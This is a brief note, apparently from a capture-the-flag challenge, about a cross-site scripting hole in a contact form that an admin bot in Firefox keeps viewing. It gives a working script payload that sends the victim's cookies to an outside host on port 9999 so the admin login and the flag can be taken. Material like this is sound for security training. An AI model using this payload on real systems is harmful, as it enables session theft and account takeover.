XSS vulnerability in contact functionality.

Cookie-stealing possible from constantly refreshing administrator using firefox.

Loging in as admin shows flag.

Use e.g. the following to leak the cookie:

<script>var i=new Image;i.src="http://mermaid.softmoo.se:9999/?"+document.cookie;</script>

NOTE: Firefox docker container with static docker-ip 10.94.182.10 need to be allowed to send data out to the internet in order to leak cookie data.
